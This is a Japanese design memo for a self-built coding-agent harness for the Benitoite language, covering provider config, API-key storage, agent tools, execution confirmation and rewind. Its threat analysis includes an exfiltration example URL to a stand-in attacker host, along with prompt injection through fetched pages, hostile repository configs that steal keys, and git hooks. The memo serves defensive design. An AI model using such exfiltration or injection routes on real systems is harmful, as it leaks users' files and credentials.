- 作成: 2026-10-04

- 設計書での位置付け: ADR 0194（TUI と自前のコーディングエージェントを、サーバモードとあわせて作る）と OPEN-056（自前のコーディングエージェントの設計）の検討にあたる。作る時期は、2026-10-04 の設計者の決定でサーバモードより後に改めた（後述）。
- 関係する検討: [LLM の提供者と認証](post-first-release-llm-providers.md)、[秘密の情報の扱い](post-first-release-secrets.md)

## 目的と範囲

処理系が持つ自前のエージェントハーネス（利用者の依頼から LLM にスクリプトを書かせ、検査と修正を繰り返す仕組み）を検討する。どの提供者をどう呼ぶかは [LLM の提供者と認証](post-first-release-llm-providers.md)で扱い、本メモは、ハーネスの設定、LLM の API キーなどの認証の情報の保管、ハーネスで何をするかを扱う。

外部のハーネス（Claude Code、Codex CLI、OpenCode など）から処理系を使う場合は、使うモデルと認証をハーネスの側で設定するので、本メモの対象外とする。

## 設計者の決定（2026-10-04）

| 事項 | 決定 |
|---|---|
| TUI と自前のエージェントを作る時期 | サーバモードより後に実装する。サーバモードとあわせて実装するのは MCP（`benitoite mcp`）だけとする。ADR 0194 の決定 1・2（サーバモードとあわせて作る）を改める |
| 使う LLM のモデルの指定 | 一般的なハーネスと同じく、設定ファイルに書く |
| 設定ファイルの形式 | TOML。モデル以外のハーネスの設定も、このファイルに書く |
| 提供者の数と切り替え | 複数の提供者を書ける。既定の提供者を決め、起動のときのオプションで切り替える |
| 役割ごとにモデルを分けること | 今回は対象外 |
| エージェントに許す操作の範囲 | (γ) を採る。加えて、プロジェクトの作成（ディレクトリと雛形の `main.bnt` を作る）と、一時的なスクリプトの作成と実行（Benitoite でできる下調べや計算など）を許す |
| 道具の一覧 | 「道具の一覧」の表のとおり |
| プロジェクトを作ってよい場所 | 利用者が書き込めるところ（ホームディレクトリの下など）ならどこでも作れる。格納先は利用者が依頼の文で指示する前提とし、作る前に絶対パスを示して確認を受ける |
| 一時的なスクリプトの置き場所 | プロジェクトの外の、セッションごとの一時ディレクトリに置き、セッションが終わったら消す。役に立ったものは `write_script` でプロジェクトへ写せる |
| ハーネスの確認とサーバモードの承認 | 別のものとして扱う。確認はハーネスの画面で受け、サーバモードはエージェント用のプロファイルの範囲で実行する。`require_approval` のスクリプトは、承認の画面での認証も要る |
| 一時的なスクリプトの確認 | 確認なしで実行できるエフェクトの範囲を設ける。既定はエフェクトなしと `Console.Write` だけとし、利用者の設定で広げられる（プロジェクトの設定では広げられない）。範囲を超えるものは確認を受ける |
| サーバモードとの接続 | デーモンの通信口に直接つなぐ。LLM に見せる道具の形は、MCP の道具と揃える |
| 非対話で使うときの許可 | 起動のときに `--allow` で許可するエフェクトを指定し、範囲を超えるスクリプトは実行せずに終わる。`--allow` を省いたときは、一時的なスクリプトの確認なしの範囲だけを許す。一覧にないドメインは取得せず、プロジェクトは `--dir` で指定した場所にだけ作る |
| サーバモードの時点の承認の画面 | 承認の画面だけを、TUI の部品で先に作る。サーバモードとあわせて実装し、後で作る TUI と見た目と操作を揃える |
| 巻き戻し | プロジェクトのディレクトリの状態をまるごと記録して戻す（型 2） |
| git の操作 | ブランチの作成（新しいプロジェクト用）、コミット、コミットの時点に戻すことを、ハーネスの道具にする。git のライブラリを使い、hooks などを起動しない。戻すのは作業ツリーの中身だけで、履歴は消さない。道具の一覧は実装の前に見直す。ブランチの操作は別に検討する |
| ウェブの取得 | 道具に加える（ほかの言語の実装や、有志のスクリプトを参照するため）。利用者の設定の一覧にあるドメインは確認なしで取得し、それ以外はドメインごとに確認する（対策 (a)+(b)） |
| プロジェクトごとの設定ファイル | 設ける方向。根のディレクトリ（`main.bnt` のあるディレクトリ）に置く。`main.bnt` がまだないときは、起動のときにディレクトリを指定したらそこをプロジェクトとし、指定がなければ利用者の設定だけを使う |
| プロジェクトの設定ファイルで書ける欄 | 限る方向（対策 (a)）。利用者の設定で定義した提供者を名前で選ぶことと、モデルを変えることだけを許す |

## 設定ファイル

使う提供者、モデル、ベースの URL は、TOML の設定ファイルに書く。モデル以外のハーネスの設定も、同じファイルに書く。提供者は複数書け、そのうち一つを既定の提供者とする。起動のときのオプションで、名前を指定して別の提供者に切り替える。役割ごとにモデルを分けること（スクリプトを書くモデルと、診断を説明する軽いモデルなど）は、今回は対象外とする。

設定ファイルは二つある。利用者単位のファイル（`~/.config/benitoite/` の下など）と、プロジェクトごとのファイル（後述の「プロジェクトごとの設定ファイル」）である。どちらも、作業ディレクトリや親のディレクトリを辿って探さない。利用者単位のファイルは、サーバモードを加えた後のスタンドアロンモードが読む利用者単位の方針のファイル（ADR 0187）と、同じ場所に置くか別のファイルにするかを決める。

設定ファイルには、API キーそのものを書かせず、キーの参照だけを書く（後述）。

形の例（欄の名前は仮）:

```toml
[harness]
default_provider = "openai"

[providers.openai]
kind = "openai-responses"
model = "gpt-..."
api_key = { keystore = "benitoite/openai" }

[providers.local]
kind = "openai-chat"
base_url = "http://localhost:11434/v1"
model = "gemma..."

[providers.gemini]
kind = "gemini"
model = "gemini-..."
api_key = { env = "GEMINI_API_KEY" }
```

```text
benitoite agent "..."                       # 既定の提供者（openai）を使う
benitoite agent --provider local "..."      # local に切り替える
```

決めること:

- ファイルの名前と、欄の名前。
- 切り替えのオプションの名前と、モデルだけを起動のときに変えるオプションを設けるか。
- プロジェクトの設定ファイルの名前と、利用者の設定との重ね方（後述の書ける欄の制限とあわせる）。

### プロジェクトごとの設定ファイル

【方針】利用者単位の設定ファイルに加え、プロジェクトごとの設定ファイルを設ける。置き場所は、根のディレクトリ（`main.bnt` のあるディレクトリ。ADR 0127）だけとし、作業ディレクトリや親のディレクトリを辿って探さない。根のディレクトリは起動したパスから決まり、作業ディレクトリに依存しないので、どこから起動しても同じファイルを読む。OPEN-048 が挙げた「親へ辿る方法は、起動した場所によって効く設定が変わる」という問題には当たらない。

ハーネスでスクリプトを新しく作る場面では、`main.bnt` がまだないことがある。このときは次のように決める。

- 起動のときにディレクトリを指定したら、そのディレクトリをプロジェクトとし、そこの設定ファイルを読む。
- 指定がなければ、利用者の設定だけを使う。

設計書へ移すときは、06-01 の「処理系は、プロジェクトの設定ファイルを読まない」を改め、OPEN-048 を決着させる ADR が要る。[パッケージ管理](post-first-release-package-management.md)の「依存を書く場所」とあわせて、一つの設定ファイルにまとめるかも決める。

他人のリポジトリを取ってきてハーネスを起動すると、そのリポジトリの設定ファイルが効く。プロジェクトの設定でベースの URL やキーの参照まで書けると、ベースの URL を攻撃者のサーバに向けて、利用者の API キーや送る文脈を盗むことや、別のサービスのキーを入れた環境変数を提供者のキーとして送らせることができてしまう。対策として (a) を採る方向とする。検討した案は次の二つである。

- **(a) 書ける欄を限る。** プロジェクトの設定では、利用者の設定で定義した提供者を名前で選ぶことと、モデルを変えることだけを許す。ベースの URL とキーの参照は、利用者の設定にだけ書ける。
- **(b) 信頼の確認。** 初めて読むプロジェクトの設定ファイルは、利用者が承認してから効かせる。承認した後に中身が変わったら、改めて確かめる（VS Code のワークスペースの信頼、Claude Code がフォルダを初めて開くときの確認と同じ考え方）。

(b) は採らない。(a) で足りない欄（プロジェクトごとに変えたいハーネスの設定など）が出てきたら、その欄が (a) の問題（キーや文脈を外へ送らせる）を起こさないかを確かめ、起こすなら (b) を改めて検討する。

## API キーの保管

### 主なハーネスの実装（2026-10-04 に一次資料で確認）

| ハーネス | 環境変数 | 設定ファイルからの参照 | 専用の認証ファイル | OS のキーストア | ヘルパーのコマンド |
|---|---|---|---|---|---|
| Claude Code | `ANTHROPIC_API_KEY` など | 設定の `env` | `~/.claude/.credentials.json`（モード 0600） | macOS は Keychain。書き込めないときはファイルに切り替える | `apiKeyHelper` |
| Codex CLI | `OPENAI_API_KEY`。他の提供者は `env_key` で変数の名前を指定する | `env_key` | `~/.codex/auth.json` | `cli_auth_credentials_store` で選ぶ | なし |
| OpenCode | 対応 | `{env:VAR}`・`{file:path}` | `~/.local/share/opencode/auth.json`（`/connect` で書く） | 資料に記述なし | なし |
| Gemini CLI | `GEMINI_API_KEY` | `.env` を探して読む | OAuth の情報を手元に保存する（場所は資料に記述なし） | 資料に記述なし | なし |
| aider | 対応 | `.env`、`.aider.conf.yml` | なし | 資料に記述なし | なし |

各ハーネスの細かい点は次のとおりである。

- Claude Code は、macOS では Keychain に保存し、Keychain が書き込みを拒んだとき（SSH でロックされているときなど）は、Linux と同じ 0600 のファイルに保存する。`apiKeyHelper` は、指定したスクリプトを実行し、その出力をキーとして使う。vault から有効期限の短いトークンを取る用途を想定している。認証の情報が複数あるときは、クラウドの基盤、`ANTHROPIC_AUTH_TOKEN`、`ANTHROPIC_API_KEY`、`apiKeyHelper`、`CLAUDE_CODE_OAUTH_TOKEN`、プロファイル、`/login` のログインの順に選び、`/status` で使っているものを示す。
- Codex CLI の `cli_auth_credentials_store` は、`file`（`auth.json`）、`keyring`（OS のキーストア）、`auto`（キーストアを試し、使えなければファイル）、`ephemeral`（プロセスのメモリの中だけ）から選ぶ。文書は、`auth.json` をパスワードと同じように扱うよう注意している。
- OpenCode は、設定ファイルの `"apiKey": "{env:ANTHROPIC_API_KEY}"` のように、環境変数やファイルの参照を書ける。
- Gemini CLI は、今いるディレクトリから上へ探して最初に見つけた `.env` と、`~/.gemini/.env` を読む。文書は、シェルの設定で環境変数に入れたキーは、そのシェルから起動したどのプロセスも読めると注意している。

出典: [Claude Code の認証](https://code.claude.com/docs/en/iam)、[Codex の認証](https://learn.chatgpt.com/docs/auth)、[OpenCode の提供者](https://opencode.ai/docs/providers/)、[Gemini CLI の認証](https://geminicli.com/docs/get-started/authentication/)、[aider の API キー](https://aider.chat/docs/config/api-keys.html)

### Benitoite の見立て

暫定の見立てとして、次の形をとる。

1. **設定ファイルには参照だけを書く。** 提供者ごとに、キーをどこから取るか（OS のキーストアの項目、環境変数の名前、ヘルパーのコマンド）を書く。キーそのものを書く欄は設けない。設定ファイルを共有・公開しても、キーが漏れない。
2. **保存は OS のキーストアを第一とする。** `benitoite auth login <提供者>` のようなコマンドで、キーを入力させて OS のキーストア（macOS の Keychain、Windows の資格情報マネージャ、Linux の Secret Service）に保存する。キーストアを使えないときだけ、利用者だけが読める 0600 のファイルに保存し、そのことを利用者に示す（Codex の `auto`、Claude Code の切り替えと同じ形）。キーストアの扱いは、[秘密の情報の扱い](post-first-release-secrets.md)で検討した仕組みと共有する。
3. **ヘルパーのコマンドを用意する。** 指定したコマンドを実行し、その出力をキーとして使う。パスワードマネージャ（Proton Pass CLI など）や vault を、そのままつなげる。秘密の検討の、パスワードマネージャから受け取る方法と揃える。
4. **環境変数も読む。** 既存の道具との互換のために、`OPENAI_API_KEY`・`ANTHROPIC_API_KEY`・`GEMINI_API_KEY` などを読む。
5. **優先順位を決め、使っているものを示す。** 複数の源があるときの順を決め、どの源のキーを使っているかを表示するコマンド（Claude Code の `/status` に当たるもの）を設ける。
6. **OAuth の情報も同じ所に保存する。** Sign in with ChatGPT（B）のリフレッシュトークンも、2 と同じくキーストアに保存する。L（Claude Code の CLI を経由する）は、認証の情報を CLI に任せるので、処理系は保存しない。

避けること:

- **`.env` を自動で読まない。** 今いるディレクトリから `.env` を探して読むと、他人のリポジトリで実行したときに、意図しないキーやベースの URL を読み込むおそれがある。06-01 の「設定ファイルを探さない」規則にも反する。
- **キーをスクリプトと外部コマンドに渡さない。** ハーネスが起動するスクリプトや外部コマンドの環境から、LLM のキーの環境変数を消す。消さないと、スクリプトが `Process.environmentVariable` でキーを読める。秘密の検討の「外部コマンドに渡す環境変数の制御」と同じ問題である。
- **キーを出力と記録に出さない。** 診断、ログ、LLM へ送る文脈にキーを含めない。

## ハーネスで何をするか

### 設計書の既存の決定

自前のエージェントは、設計書ですでに扱っている。本節は、その未決事項の検討にあたる。

- ADR 0194: TUI と自前のコーディングエージェントを、サーバモードとあわせて作る。エージェントは、サーバモードを通してスクリプトを検査・実行する。このうち作る時期は、2026-10-04 に改めた（次項）。LLM を使ったテスト（OPEN-012 の測定など）にも使える形を目指す。LLM の API のクライアントと TUI の部品には、既存の OSS を使う。
- 時期の変更（2026-10-04、設計者の決定）: TUI と自前のエージェントは、サーバモードより後に実装する。サーバモードとあわせて実装するのは MCP だけとする。設計書へ移すときは、ADR 0194 を改める ADR を作り、06-07「構成」の表の「自前のコーディングエージェント」の行と、ロードマップの記述を直す。エージェントがサーバモードを通してスクリプトを検査・実行すること（決定 2 の後半）と、LLM を使ったテストに使えること（決定 3）は変えない。
  - 影響: ADR 0194 の決定 1 は、TUI に承認の画面（ADR 0188）を含めていた。サーバモードの認証は承認の画面を要するので、TUI を後に回すなら、サーバモードの時点で承認の画面だけを別に用意する必要がある（`server approve` を端末の簡単な対話の画面にするなど）。【方針】承認の画面だけを、TUI の部品（画面の枠組み）で先に作り、サーバモードとあわせて実装する（2026-10-04、設計者の決定）。後で作る TUI と、見た目と操作を揃えるためである。端末の簡単な対話の画面で済ませる案は、作る量が少ないが、後で TUI ができたときに作り直すか残すかの判断が要るので採らない。TUI の部品には既存の OSS を使う（ADR 0194 の決定 4）ので、その部品をサーバモードの時点で取り込むことになる。
- OPEN-056（未決）: 次の点を決める。対応する LLM の提供元とクレート（[LLM の提供者と認証](post-first-release-llm-providers.md)で検討）、道具の範囲とサーバモードの操作への対応、サーバモードとの接続の形とプロファイル（ADR 0192）、テストの用途で要る機能、TUI の画面の構成と承認の画面（ADR 0188）との関係。
- OPEN-056 には、2026-10-01 に、エージェントが行える操作を Benitoite のスクリプトの検査と実行に限る案が候補として加えてある。シェルや汎用の言語の処理系を一度許すと、コマンドの文字列による許可の規則では操作を細かく制限できない。道具を「スクリプトを書いて検査し、実行する」ことに限れば、制限をスクリプトの型とエフェクトに移せる。先例は TACIT（08-03「AI エージェントの権限制御の研究」）である。

ここで、目的を二つに整理しておく。

1. **利用者の入口**: 利用者が、作業と許可する操作を決めるだけで、言語を学ばずに作業を自動化する（00-01「目指す方向」）。既存のエージェントと Skill の組み合わせでも同じことはできるので、自前のハーネスの価値は、操作の範囲を型とエフェクトで限れることと、実行の前の確認を処理系が強制できることにある。Skill の「実行の前の確認」（ADR 0231）は、手順を守るかをエージェントに任せており、処理系は強制しない。
2. **LLM を使ったテスト**: 構文の測定（OPEN-012）と Skill の評価（06-06）を、処理系と一体で制御できるエージェントで行う。

### エージェントに許す操作の範囲

中心の論点は、エージェントに何をさせるかである。案は三つある。

- **(α) 一般のコーディングエージェントと同じ範囲。** シェル、任意のファイルの読み書き、ウェブの取得を許す。どんな作業もできるが、既存のエージェントと同じものを作ることになり、操作の制限はコマンドの文字列の規則に頼る。自前で作る理由が薄い。
- **(β) Benitoite のスクリプトの作成・検査・実行だけ。** OPEN-056 の候補そのものである。エージェントが行いうる操作は、利用者が確認した `main` のエフェクトの範囲に収まる。ただし、入力のファイルの形（CSV の見出しなど）を確かめるにも、読み取りのスクリプトを書いて実行し、そのたびに確認を受ける必要があり、手間が大きい。
- **(γ) (β) に、作業ディレクトリの中の読み取りの道具を加える。** ハーネス自身が、プロジェクトのディレクトリの下のファイルの一覧と読み取りを、道具として提供する。読み取りはハーネスのコード（信頼できる側）が行い、範囲をプロジェクトのディレクトリに限る。書き込みは `.bnt` のファイルに限る。

【方針】(γ) を採る（2026-10-04、設計者の決定）。(β) の性質（外への操作はすべて、検査して利用者が確認したスクリプトを通る）を保ったまま、スクリプトを書くための下調べを軽くできる。読み取った内容は LLM の提供者へ送られるので、後述の「送る内容」で扱う。

あわせて、次の二つを許す（同日、設計者の決定）。

- **プロジェクトの作成**: ディレクトリを作り、雛形の `main.bnt` を置く。作ったディレクトリが、以後のプロジェクト（根のディレクトリ）になる。利用者が書き込めるところ（ホームディレクトリの下など）ならどこにでも作れる。格納先は利用者が依頼の文で指示する前提とする。LLM が組み立てたパスをそのまま使わないよう、作る前に絶対パスを示して確認を受け、すでにあるディレクトリには作らない。
- **一時的なスクリプト**: プロジェクトのスクリプトとは別に、Benitoite で書ける下調べや計算（データの集計を試す、標準ライブラリの振る舞いを確かめるなど）のスクリプトを作って実行する。一時的なスクリプトも、検査と実行の前の確認を通る。外への操作がスクリプトを通るという (β) の性質は変わらない。

標準ライブラリにない操作（git、パッケージマネージャなど）を要する作業は、スクリプトの中の `Process.Run` か、コマンドを包むライブラリ（[コマンドを代替するライブラリ](post-first-release-command-libraries.md)）で行う。どちらも `main` のエフェクトに現れ、プロファイルと方針で拒否できる。

### 道具の一覧（(γ) の場合）

| 道具 | 内容 | 利用者の確認 |
|---|---|---|
| `create_project` | 新しいディレクトリを作り、雛形の `main.bnt` を置く | 要る（作る場所を示す） |
| `write_script` | プロジェクトのディレクトリの下に `.bnt` のファイルを書く・直す | 要らない（差分は画面に示す） |
| `run_scratch` | 一時的なスクリプトを書いて、検査し、実行する。置き場所はプロジェクトの外の、セッションごとの一時ディレクトリで、セッションが終わったら消す。役に立ったものは `write_script` でプロジェクトへ写せる | 実行の前の確認に従う |
| `check` | スクリプトを検査し、診断を JSON で返す | 要らない |
| `explain` | 診断のコードの説明を返す（MCP の `explain` と同じ表） | 要らない |
| `read_reference` | 同梱の Skill の参照の文書（文法、標準ライブラリのリファレンス、イディオム集など。ADR 0288 で実行ファイルに埋め込み済み）を読む | 要らない |
| `list_files`・`read_file` | プロジェクトのディレクトリの下のファイルの一覧と中身を読む。大きさに上限を設ける | 要らない（後述の除外の規則に従う） |
| `run` | サーバモードのジョブとしてスクリプトを実行し、終了状態と出力を返す | 要る（後述の「実行の前の確認」） |
| `web_fetch` | URL の内容を取得し、本文を文字にして返す（後述の「ウェブの取得」） | 一覧にないドメインは要る |
| `test` | `benitoite test` に当たる。テストの関数のエフェクトを確認してから実行する | 要る |
| `ask_user` | 利用者に質問する | — |

持たせないもの: シェル、プロジェクトの外のファイルの読み書き、外部の MCP サーバへの接続。外部の MCP サーバを許すと、(β) の性質が崩れる。

### ウェブの取得

設計者の決定（2026-10-04）により、ウェブの取得を道具に加える。ほかの言語での実装を見て Benitoite での書き方を考える、有志が作ったスクリプトを参照する、などに使う。

取得はハーネスのコード（信頼できる側）が行う読み取りだが、次の二つの危険がある。

- **情報の持ち出し**: LLM は URL を自由に組み立てられるので、プロジェクトで読んだ内容を URL の道や問い合わせの部分に載せて、外のサーバへ送れる（`https://attacker.example/?d=<ファイルの中身>`）。外への操作がすべて確認済みのスクリプトを通るという (β) の性質は、`web_fetch` については成り立たない。
- **埋め込まれた指示**: 取得したページに、エージェントへの指示が書かれていることがある。

対策の候補:

- **(a) ドメインごとの確認**: 初めて取得するドメインは、利用者の確認を受ける。確認したドメインは、セッションの間（または利用者の設定に書いて以後も）確認を省く。Claude Code の WebFetch もドメインごとに許可を求める形をとる【要検証】。
- **(b) 許可するドメインの一覧**: 利用者の設定に書いたドメイン（github.com、各言語の文書のサイトなど）だけを取得する。プロジェクトの設定では一覧を広げられない。
- **(c) 取得の形を限る**: GET だけ、クッキーと認証の情報を送らない、大きさの上限、HTML を本文の文字にして返す。
【方針】(a) と (b) を組み合わせる（2026-10-04、設計者の決定）。利用者の設定の一覧にあるドメインは確認なしで取得し、それ以外のドメインは初めて取得するときに確認を受け、セッションの間は確認を省く。一覧はプロジェクトの設定では広げられない。取得の形は (c) のとおりに限る。

- 検索: URL を知らずに探すには検索が要る。提供者の側の検索の道具（各社の API が持つウェブ検索）を使うか、検索の API を別に契約するかは【要検証】。

### 作業の流れ

1. 利用者が作業を依頼する。ハーネスは、必要なら質問する。
2. エージェントが、下調べ（`list_files`・`read_file`・`read_reference`）をしてスクリプトを書く。
3. `check` と修正を、検査が通るまで繰り返す。回数に上限を設ける（Skill の評価と同じく 10 回を既定の候補とする）。上限に達したら、止めて利用者に報告する。
4. 実行の前の確認を行う（次節）。
5. サーバモードでジョブとして実行し、結果を利用者に示す。エージェントは、結果が依頼に合うかを確かめ、合わなければ 2 に戻る。
6. 既存のスクリプトを直すときは、`main` のエフェクトと公開の関数の型の変化を、直す前と比べて示す（設計原則 2、OPEN-015）。

### 実行の前の確認

Skill の「実行の前の確認」（ADR 0231）と同じ内容を、ハーネスが強制する。

- 初めて実行するときと、`main` のエフェクトが前に確認したときより増えたときに、エフェクトを利用者の言葉で示し、承認を受ける。`Process.Run` を含むときは、起動するコマンドの名前も示す。
- 確認はハーネスの画面（TUI）で行う。LLM の道具には承認の操作を含めないので、エージェントは確認を飛ばせない。脅威の前提として、ハーネスのコードは信頼し、LLM の出力（と、LLM が読んだファイルや実行結果に含まれる指示）は信頼しない。
- 実行は、エージェント用のプロファイル（ADR 0192）で行う。利用者が承認したエフェクトでも、プロファイルと方針が許さない操作は、サーバモードが実行の前に拒否する。
- 【方針】ハーネスの確認と、サーバモードの承認の画面での認証（ADR 0188）は、別のものとして扱う（2026-10-04、設計者の決定）。ハーネスの確認は「このエフェクトで実行してよいか」の同意であり、ハーネスの画面で受ける。サーバモードは、確認を通った実行も、エージェント用のプロファイルの範囲でだけ行い、範囲を超える操作は拒否する。`require_approval` を付けたスクリプトは、ほかのクライアントと同じく、承認の画面での認証も要る。すべての実行を承認の画面に回す案は、実行のたびに別の端末での認証が要り、重すぎるので採らない。
- 【方針】一時的なスクリプト（`run_scratch`）は、毎回新しく作るので、確認なしで実行できるエフェクトの範囲を設ける（同日、設計者の決定）。範囲の既定は、エフェクトなし（純粋な計算）と `Console.Write` だけとする。利用者の設定で範囲を広げられる（`File.Read`、`Clock.Time` など）が、プロジェクトの設定では広げられない。範囲を超えるスクリプトは、プロジェクトのスクリプトと同じく確認を受ける。`File.Read` を範囲に加えるときは、エージェント用のプロファイルで読める場所を限ることを、利用者向けの文書で勧める。

### サーバモードとの接続

- **(a) デーモンの通信口を直接使う。** ハーネスは同じ実行ファイルの中にあるので、`benitoite server …` のクライアントと同じ部品で、JSON-RPC の要求を送れる。
- **(b) MCP（`benitoite mcp`）を通す。** 外部のエージェントと同じ口を使うので、道具の振る舞いが揃う。中継の分だけ層が増える。

【方針】(a) を採る（2026-10-04、設計者の決定）。ただし、LLM に見せる道具の形（名前、引数、返す JSON）は、MCP の道具（06-07「MCP の道具」）と揃える。候補 L（Claude Code の CLI を経由する提供者）では、ハーネスの道具を MCP で CLI に見せる必要があるので、同じ形にしておけば流用できる。

ハーネスはサーバモードより後に作るので、サーバモードがあることを前提にしてよい。サーバモードのない版で動かす経路は作らない。

### 送る内容と秘密

`read_file` で読んだ内容、スクリプトの出力、診断は、LLM の提供者へ送られる。

- [LLM の提供者と認証](post-first-release-llm-providers.md)の「利用者への表示」に従い、外部へ送ることを示す。
- `read_file` は、秘密を含みやすいファイル（`.env`、秘密鍵、`.git/` の中など）を既定で読まない。除外の一覧は設定で足せるが、プロジェクトの設定では減らせない（プロジェクトの設定で書ける欄を限る方針と揃える）。
- スクリプトの出力を LLM に返す量に上限を設ける。秘密を出力するスクリプトの扱い（TACIT の `Classified` のように、利用者の画面にだけ出して LLM には伏せる仕組み）は、[秘密の情報の扱い](post-first-release-secrets.md)の `Secret` の型とあわせて検討する。
- ファイルや実行結果に埋め込まれた指示（プロンプトインジェクション）で、エージェントが意図しないスクリプトを書くことは防げない。防ぐのは、そのスクリプトが確認を受けていない操作を行うことである。

### 対話の形

- **対話（TUI）**: ハーネスとあわせて作る TUI の中で、依頼、エージェントの進み具合、差分、実行の前の確認、結果を示す。
- **非対話**: `benitoite agent -p "<依頼>"` のように、一回の依頼を処理して終わる形も設ける。テストの用途と、ほかのスクリプトからの利用に使う。【方針】非対話では、実行の前の確認を対話で受けられないので、次のように扱う（2026-10-04、設計者の決定）。
  - 許可するエフェクトを起動のときに指定する（例: `--allow File.Read,File.Write`）。エフェクトがその範囲に収まるスクリプトだけを実行し、超えるスクリプトは実行せずに、理由を示して終わる。
  - `--allow` を省いたときは、一時的なスクリプトの確認なしの範囲（既定ではエフェクトなしと `Console.Write`）だけを許す。指定を忘れても、狭い範囲に収まる。
  - 確認の要る操作のうち、ウェブの取得は一覧にあるドメインだけを取得し、プロジェクトの作成は `--dir` で指定した場所にだけ行う。

### 対話の操作（入力の履歴、キャンセル、巻き戻し）

`/` で始まるコマンドの一覧は、別に検討する。ここでは、一般的なハーネスにある次の三つを扱う。

**入力の履歴**: 入力欄で、上下のキーで前の入力を辿れるようにする。セッションをまたいで残すときは、利用者だけが読めるファイル（0600）に、件数の上限を設けて保存する。利用者が入力欄にパスワードやトークンを貼ることがあるためである。履歴を利用者ごとに一つにするか、プロジェクトごとに分けるかは未決とする。

**キャンセル**: ESC を押すと、そのときの処理を止める。

| 押したとき | 止め方 |
|---|---|
| LLM の応答を待っている、または受け取っている途中 | 要求を打ち切る。途中までの応答は、中断したものとして示す |
| 検査やウェブの取得の途中 | その道具の処理を打ち切る |
| スクリプトの実行の途中 | サーバモードの `job stop` で止める（06-07「ジョブ」の止め方。中断の要求の後、10 秒で終わらなければ強制的に止める） |

止める前にスクリプトが行った操作は戻らないので、そのことを示す。

**巻き戻し（Claude Code の `/rewind` に当たる）**: 【方針】プロジェクトのディレクトリの状態をまるごと記録して戻す形（型 2）を採る（2026-10-04、設計者の決定）。

主なハーネスの作り（2026-10-04 に確認）は二つの型に分かれる。

- 型 1（編集の道具の変更だけを戻す）: Claude Code は、依頼のたびに記録し、会話とコードを戻せるが、Bash のコマンドで変えたファイルは戻さないと明記している（[Checkpointing](https://code.claude.com/docs/en/checkpointing)）。
- 型 2（ファイルの状態をまるごと記録する）: OpenCode の `/undo` は会話とファイルの変更を戻し、内部で git を使うので git のリポジトリを要する（[TUI](https://opencode.ai/docs/tui/)）。Gemini CLI は、ファイルを変える道具を承認したときに `~/.gemini/history/<プロジェクトのハッシュ>` の影の git リポジトリに記録し、`/restore` でファイルと会話を戻す（[Checkpointing](https://geminicli.com/docs/cli/checkpointing/)）。Codex CLI の `/undo` は、作業ツリーを参照のないコミット（ghost commit）に記録して `git restore` で戻す作りと、ソースの写しから読める。公式の文書での確認は【要検証】。

Benitoite のハーネスでは、次のようにする。

- 依頼を受けるたびと、`run`・`test`・`run_scratch` で実行する前に、プロジェクトのディレクトリの状態を記録する。スクリプトがプロジェクトの中に書いたファイルも戻せる。
- プロジェクトが git のリポジトリとは限らないので、記録はハーネスが持つ影の git リポジトリ（Gemini CLI と同じ形）か、記録用のディレクトリへの写しで行う。大きさに上限を設け、超えるファイルは記録から外して、そのことを示す。
- 戻すものは、会話とファイルの両方、会話だけ、ファイルだけから選ぶ。
- 戻せないもの（スクリプトがプロジェクトの外に書いたファイル、`Http.Connect` などの外部への操作、ウェブの取得）は、巻き戻しの画面で、戻す区間に含まれる実行とあわせて示す。
- 会話の保存と再開は初めは設けないので、巻き戻しはセッションの中で使う。

決めること:

- `create_project` を戻すとき、作ったディレクトリを消すか（作った後に中身が変わっていない場合に限る案を候補とする）。
- 実行の前の確認の記録（どのエフェクトまで確認済みか）を、巻き戻しで戻すか。戻さなくても許可が広がることはない。
- 記録の大きさの上限と、記録を残す期間。

### git の操作

【方針】ブランチの作成（新しいプロジェクト用）、コミット、コミットの時点に戻すことを、ハーネスの道具として持たせる（2026-10-04、設計者の決定）。ブランチの操作は、別に検討する。

- **G1 どこで行うか**: ハーネスの道具にし、ハーネスのコードが実行する（設計者の決定）。対象はプロジェクトのリポジトリに限る。コミットと作業ツリーの復元はプロジェクトの中で完結する操作であり、`write_script` と同じく、ハーネスが直接行う操作として扱う。ネットワークを使う操作（`push`・`fetch` など）は道具に含めず、必要なら Benitoite のスクリプト（[コマンドを代替するライブラリ](post-first-release-command-libraries.md)の git のライブラリ）で行う。
- **G2 別のプログラムを起動する危険**: git は、リポジトリの設定によって hooks（`pre-commit` など）、`core.fsmonitor`、diff driver などの別のプログラムを起動する。他人のリポジトリでハーネスがコミットすると、仕込まれたプログラムが確認なしに動き、(γ) の性質が崩れる。これを避けるため、git の CLI ではなく、git のライブラリ（gitoxide、libgit2 など）を使う（設計者の決定）。使うのは、hooks などを実行しないことを確かめたライブラリに限る【要検証】。利用者が自分の hooks を動かしたい要望は、別に検討する。
- **G3 道具の一覧**: 次の案とし、実装の前に改めて見直す（設計者の決定）。

| 道具 | 内容 | 利用者の確認 |
|---|---|---|
| `git_init` | `create_project` で作ったプロジェクトを git のリポジトリにし、最初のコミットを作る | `create_project` の確認に含める |
| `git_status`・`git_log`・`git_diff` | 状態、履歴、差分を読む | 要らない |
| `git_commit` | 変更をコミットする。メッセージは LLM が書き、画面に示す。作者は利用者の git の設定（`user.name`・`user.email`）を使う | 要らない（後で戻せるので） |
| `git_restore` | 作業ツリーを、指定したコミットの時点の中身に戻す | 要る |

- **G4 コミットの時点に戻すことの意味**: 作業ツリーの中身だけを戻し、履歴は消さない（設計者の決定）。戻した状態を新しいコミットにするかは、別に決める。戻す直前の状態を巻き戻しの記録に残し、戻したこと自体も取り消せるようにする。ブランチごと戻す形（`reset --hard` に当たる）は、ブランチの操作の検討に回す。
- 巻き戻しとの役割の分担: 巻き戻しは、ハーネスがターンごとに自動で記録したものを使う。`git_restore` は、利用者が意味のある区切りとして作ったコミットに戻す。

### テストの用途

- 課題（依頼の文、入力、期待する出力）を与え、非対話で実行する。
- 記録: 使った提供者・モデル・処理系の版、検査と修正の回数、LLM とのやり取りの全体、トークンの量、結果。Skill の評価の記録（06-06「Skill の評価」）と同じ形に揃える。
- 同じ条件での繰り返し: 温度などの生成の設定を記録し、固定できる提供者では固定する。完全な再現はできない前提で、複数回の試行の成功率で評価する。
- Skill の差し替え: 構文の案ごとの測定（OPEN-012）のために、`read_reference` が返す文書を差し替えられるようにする。

### 文脈の管理

- 初めの指示には、`SKILL.md` に当たる内容（作業の手順と主な言語の規則）を入れ、参照の文書は `read_reference` で必要なときに読ませる（Agent Skills の段階的な読み込みと同じ考え方）。
- 文脈が長くなったときの要約（compaction）は、初めは設けず、上限に近づいたら止めて利用者に知らせる。会話の保存と再開も、初めは設けない。

## 残っていること

